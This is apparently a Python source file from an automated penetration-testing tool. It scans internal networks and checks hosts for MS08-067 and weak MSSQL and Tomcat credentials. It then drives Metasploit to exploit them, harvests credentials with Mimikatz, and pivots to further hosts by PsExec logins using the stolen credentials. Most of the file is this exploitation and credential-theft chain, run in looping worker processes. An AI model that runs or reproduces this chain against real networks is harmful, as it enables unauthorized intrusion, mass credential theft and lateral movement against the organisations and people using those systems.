import ConfigParser
import dbfunctions
import footprintfunctions
import metasploitfunctions
import thread
import threads
import MySQLdb
import sys
import time
import os
import msfrpc
import netifaces
import traceback
import multiprocessing

from choosefootprint import footprintOptions

def addLocalResolverHosts(footprint_id):
    print "addLocalResolverHosts()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    dbfunctions.addIP(db, footprint_id, footprintfunctions.getIPAddress(), 0)

    dbfunctions.addDomain(db, footprint_id, footprintfunctions.getLocalResolver())

    footprintfunctions.extractHostsFromDomains(db, footprint_id)
    
    db.close()
    
def enumerateHosts_192(footprint_id):
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    footprintfunctions.queryDNS_192(db, footprint_id)
    print "thread terminated [enumerateHosts_192]"

def enumerateHosts_172(footprint_id):
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    footprintfunctions.queryDNS_172(db, footprint_id)
    print "thread terminated [enumerateHosts_172]"

def enumerateHosts_10(footprint_id):
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    footprintfunctions.queryDNS_10(db, footprint_id)
    print "thread terminated [enumerateHosts_10]"

def doDNSLookupsOnKnownRanges(footprint_id):
    print "doDNSLookupsOnKnownRanges()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        try:
            footprintfunctions.doDNSLookupsOnRanges(db, footprint_id)
        except:
            print "error in doDNSLookupsOnKnownRanges"
            continue
        time.sleep(5)
    print "thread terminated [doDNSLookupsOnKnownRanges]"

def doDNSLookupsOnKnownHosts(footprint_id):
    print "doDNSLookupsOnKnownHosts()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        #try:
        footprintfunctions.doDNSLookupsOnHosts(db,  footprint_id)
        #except:
        #    print "error in doDNSLookupsOnKnownHosts"
        #    continue
        time.sleep(5)
    print "thread terminated [doDNSLookupsOnKnownHosts]"

def portScanner(footprint_id):
    print "portScanner()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        try:
            footprintfunctions.portScanHosts(db, footprint_id)
        except:
            print "error in port scanner"
            continue
            
    print "thread terminated [portScanner]"
    
def rangePortScanner(footprint_id):
    print "rangePortScanner()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        footprintfunctions.portScanRanges(db, footprint_id)
    
    print "thread terminated [rangePortScanner]"

def getHTMLTitles(footprint_id,  limit):
    print "getHTMLTitles()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        footprintfunctions.checkHTTPTitles(db,  footprint_id, limit)

def getWeakSQLCreds(footprint_id,  limit):
    print "getWeakSQLCreds()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        footprintfunctions.checkWeakMsSqlCreds(db,  footprint_id, limit)

def getMS08067(footprint_id,  limit):
    print "getMS08067()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        footprintfunctions.checkMS08067(db,  footprint_id, limit)

def getWeakTomcatCreds(footprint_id,  limit):
    print "getWeakTomcatCreds()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        footprintfunctions.checkWeakTomcatCreds(db,  footprint_id, limit)

def vulnScanner(footprint_id):
    thread.start_new_thread(getHTMLTitles,  (footprint_id,  25))
    thread.start_new_thread(getWeakSQLCreds,  (footprint_id,  25))
    thread.start_new_thread(getWeakTomcatCreds,  (footprint_id,  25))
    thread.start_new_thread(getMS08067,  (footprint_id,  1))

def logVal(fn, value):
        metasploitfunctions.logVal(fn,  value)

def exploitMS08067(footprint_id):    
    logVal("ms08",  "started")
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    msfpass = ""
    while msfpass == "":
        time.sleep(2)
        msfpass = dbfunctions.getMsfPass(db,  footprint_id)
    
    connected = False
    client = None
    console_id = None
    
    logVal("ms08",  "got pass: " + msfpass)
    
    client = msfrpc.Msfrpc({})
    client.login(user='msf', password=msfpass)
    res = client.call('console.create')
    
    logVal("ms08",  "got res: " + str(res))
    console_id = res['id']
        
    logVal("ms08",  "connected")
    
    if True:
        #try:
        if True:
        #while True:
            host_data = dbfunctions.getHostVulnerableToMS08067(db,  footprint_id)
            if host_data == None:
                logVal("ms08",  "no vulnerable hosts. will check again in 5 seconds")
                time.sleep(5)
            else:
                try:
                    logVal("ms08",  "exploiting host {0}".format(host_data[0]))
                    lhost = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
                    msflog = metasploitfunctions.exploitMS08067(client,  console_id, lhost,  host_data[0],  msfpass)
                    creds = metasploitfunctions.extractMimikatzCreds(msflog)
                
                    for cred in creds:
                        dbfunctions.addDomainCreds(db,  footprint_id,  cred[1],  cred[0],  cred[2],  "", "", "")
                        logVal("ms08",  "adding creds {0} :: {1} :: {2}".format(cred[1],  cred[0],  cred[2]))
                        
                    dbfunctions.setHostExploitedDate(db,  host_data[1])
                except:
                    logVal("sql",  "error exploiting host {0}".format(host_data[0]))
                    time.sleep(1)
        #except Exception as e:
            #st = traceback.format_exc()
            #st = str(e)
            #logVal("ms08",  st)
        #    time.sleep(5)
        
def exploitWeakSqlCreds(footprint_id):
    logVal("sql",  "started")
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    msfpass = ""
    while msfpass == "":
        time.sleep(1)
        msfpass = dbfunctions.getMsfPass(db,  footprint_id)
    
    connected = False
    sqlclient = None
    sqlconsole_id = None
    
    logVal("sql",  "got pass: " + msfpass)
    
    sqlclient = msfrpc.Msfrpc({})
    sqlclient.login(user='msf', password=msfpass)
    sqlres = sqlclient.call('console.create')
    
    logVal("sql",  "got res: " + str(sqlres))
    sqlconsole_id = sqlres['id']

    if True:
        if True:
        #while True:
            host_data = dbfunctions.getHostVulnerableWeakSqlCreds(db,  footprint_id)
            if host_data == None:
                logVal("sql",  "no vulnerable hosts. will check again in 5 seconds")
                time.sleep(5)
            else:
                #try:
                if True:
                    logVal("sql",  "exploiting host {0}".format(host_data[0]))
                    lhost = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
                    msflog = metasploitfunctions.exploitWeakMsSqlCreds(sqlclient,  sqlconsole_id, lhost,  host_data[0],  msfpass,  host_data[3].split(":")[0],  host_data[3].split(":")[1].replace("<empty>",  ""))
                    logVal("sql",  "done exploiting {0}. extracting creds".format(host_data[0]))
                    creds = metasploitfunctions.extractMimikatzCreds(msflog)
                    
                    for cred in creds:
                        dbfunctions.addDomainCreds(db,  footprint_id,  cred[1],  cred[0],  cred[2],  "", "", "")
                        logVal("sql",  "adding creds {0} :: {1} :: {2}".format(cred[1],  cred[0],  cred[2]))
                    
                    dbfunctions.setHostExploitedDate(db,  host_data[1])
#                except:
#                    logVal("sql",  "error exploiting host {0}".format(host_data[0]))
#                    time.sleep(1)
        #except:
        #    logVal("sql",  sys.exc_info()[0])
        #    time.sleep(5)







def exploitWeakTomcatCreds(footprint_id):
    logVal("tomcat",  "started")
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    msfpass = ""
    while msfpass == "":
        time.sleep(1)
        msfpass = dbfunctions.getMsfPass(db,  footprint_id)
    
    connected = False
    sqlclient = None
    sqlconsole_id = None
    
    logVal("tomcat",  "got pass: " + msfpass)
    
    sqlclient = msfrpc.Msfrpc({})
    sqlclient.login(user='msf', password=msfpass)
    sqlres = sqlclient.call('console.create')
    
    logVal("tomcat",  "got res: " + str(sqlres))
    sqlconsole_id = sqlres['id']

    if True:
        if True:
#        while True:
            host_data = dbfunctions.getHostVulnerableWeakTomcatCreds(db,  footprint_id)
            if host_data == None:
                logVal("tomcat",  "no vulnerable hosts. will check again in 5 seconds")
                time.sleep(5)
            else:
                #try:
                if True:
                    logVal("tomcat",  "exploiting host {0}".format(host_data[0]))
                    lhost = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
                    msflog = metasploitfunctions.exploitWeakTomcatCreds(sqlclient,  sqlconsole_id, lhost,  host_data[0],  msfpass,  host_data[3].split(":")[0],  host_data[3].split(":")[1].replace("<empty>",  ""))
                    logVal("tomcat",  "done exploiting {0}. extracting creds".format(host_data[0]))
                    creds = metasploitfunctions.extractMimikatzCreds(msflog)
                    
                    for cred in creds:
                        dbfunctions.addDomainCreds(db,  footprint_id,  cred[1],  cred[0],  cred[2],  "", "", "")
                        logVal("tomcat",  "adding creds {0} :: {1} :: {2}".format(cred[1],  cred[0],  cred[2]))
                    
                    dbfunctions.setHostExploitedDate(db,  host_data[1])
#                except:
#                    logVal("sql",  "error exploiting host {0}".format(host_data[0]))
#                    time.sleep(1)
        #except:
        #    logVal("sql",  sys.exc_info()[0])
        #    time.sleep(5)

def vulnExploiter(footprint_id,  options):
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    msfpass = ""
    while msfpass == "":
        time.sleep(1)
        msfpass = dbfunctions.getMsfPass(db,  footprint_id)
            
    while True:
        if options.exploitMs08067:
            host_data = dbfunctions.getHostVulnerableToMS08067(db,  footprint_id)
            if host_data == None:
                logVal("ms08",  "no vulnerable hosts. will check again in 5 seconds")
            else:
                print "exploiting ms08"
                p1 = multiprocessing.Process(target=exploitMS08067, args=(footprint_id, ))
                p1.start()
                p1.join()
        
        if options.expoitWeakMsSqlCreds:
            host_data = dbfunctions.getHostVulnerableWeakSqlCreds(db,  footprint_id)
            if host_data == None:
                logVal("sql",  "no vulnerable hosts. will check again in 5 seconds")
            else:
                print "exploiting sql"
                p2 = multiprocessing.Process(target=exploitWeakSqlCreds, args=(footprint_id, ))
                p2.start()
                p2.join()

        if options.exploitWeakTomcatCreds:
            host_data = dbfunctions.getHostVulnerableWeakTomcatCreds(db,  footprint_id)
            if host_data == None:
                logVal("tomcat",  "no vulnerable hosts. will check again in 5 seconds")
            else:
                print "exploiting tomcat"
                p2 = multiprocessing.Process(target=exploitWeakTomcatCreds, args=(footprint_id, ))
                p2.start()
                p2.join()
        
        if options.credPivot:
            host_data = dbfunctions.getHostToLogInTo(db,  footprint_id)
            if host_data == None:
                logVal("cred",  "no hosts to log in to. will check again in 5 seconds")
            else:
                #collectCredentials(footprint_id)
                print "logging in with known creds"
                p = multiprocessing.Process(target=collectCredentials, args=(footprint_id, ))
                p.start()
                p.join()
        
        time.sleep(1)
    
def collectCredentials(footprint_id):
    logVal("cred",  "started")
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    msfpass = ""
    while msfpass == "":
        time.sleep(1)
        msfpass = dbfunctions.getMsfPass(db,  footprint_id)
    
    connected = False
    client = None
    console_id = None
    
    logVal("cred",  "got pass: " + msfpass)
    
    client = msfrpc.Msfrpc({})
    client.login(user='msf', password=msfpass)
    res = client.call('console.create')
    
    logVal("cred",  "got res: " + str(res))
    console_id = res['id']
    
    #while True:
    if True:
        if True:
            host_data = dbfunctions.getHostToLogInTo(db,  footprint_id)
            if host_data == None:
                logVal("cred",  "no hosts to log in to. will check again in 5 seconds")
                time.sleep(5)
            else:
                #try:
                if True:
                    logVal("cred",  "log in to host {0} with creds {1}\{2} : {3}".format(host_data[1],  host_data[3],  host_data[4],  host_data[5]))
                    lhost = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
                    msflog = metasploitfunctions.loginWithPsExec(client,  console_id, lhost,  host_data[1],  msfpass,  host_data[3],  host_data[4],  host_data[5])
                    logVal("cred",  "logged into {0}. looking for creds".format(host_data[1]))
                    
                    loginSuccess = True
                    for l in msflog:
                        if l.find("STATUS_LOGON_FAILURE") > -1:
                            loginSuccess = False
                            logVal("cred",  "creds did not work on {0}".format(host_data[1]))
                            dbfunctions.addLoginAttemptResult(db,  host_data[0],  host_data[2],  False)
                            
                            
                    if loginSuccess:
                        logVal("cred",  "creds worked on {0}".format(host_data[1]))
                        dbfunctions.addLoginAttemptResult(db,  host_data[0],  host_data[2],  True)
                        creds = metasploitfunctions.extractMimikatzCreds(msflog)
                    
                        for cred in creds:
                            dbfunctions.addDomainCreds(db,  footprint_id,  cred[1],  cred[0],  cred[2],  "", "", "")
                            logVal("cred",  "adding creds {0} :: {1} :: {2}".format(cred[1],  cred[0],  cred[2]))
                #except:
                    #logVal("cred",  "an error occurred")
            cleanup = client.call('console.destroy',[console_id])
            
    
def listenToBroadcasts(footprint_id,  cmd):
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    while True:
        try:
            footprintfunctions.listenToBroadcasts(db,  footprint_id,  cmd)
        except:
            continue
        
        time.sleep(1)
    print "thread terminated [listenToBroadcasts]"
    
def zoneTransferDomains(footprint_id):
    print "zoneTransferDomains()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    domains = []
    
    cursor = db.cursor()
    cursor.execute("select domain_name from domains where footprint_id = %s and zone_transfer_attempted = 0",  (footprint_id))
    for domain in cursor.fetchall():
        domains.append(domain[0])
    cursor.close()
    
    for domain in domains:
        footprintfunctions.zoneTransferDomain(db, footprint_id,  domain)
        
        cursor = db.cursor()
        cursor.execute("update domains set zone_transfer_attempted = 1 where footprint_id = %s and domain_name = %s",  (footprint_id,  domain))
        cursor.close()
    print "thread terminated [zoneTransferDomains]"

def startMetasploit(footprint_id):
    print "startMetasploit()"
    conf = ConfigParser.ConfigParser()
    conf.read("connections.conf")
    
    db = MySQLdb.connect(host="localhost", user=conf.get('MySQL',  'user'), passwd=conf.get('MySQL',  'pass'), db=conf.get('MySQL',  'db'))
    db.autocommit(True)
    
    footprintfunctions.startMetasploit(db,  footprint_id)
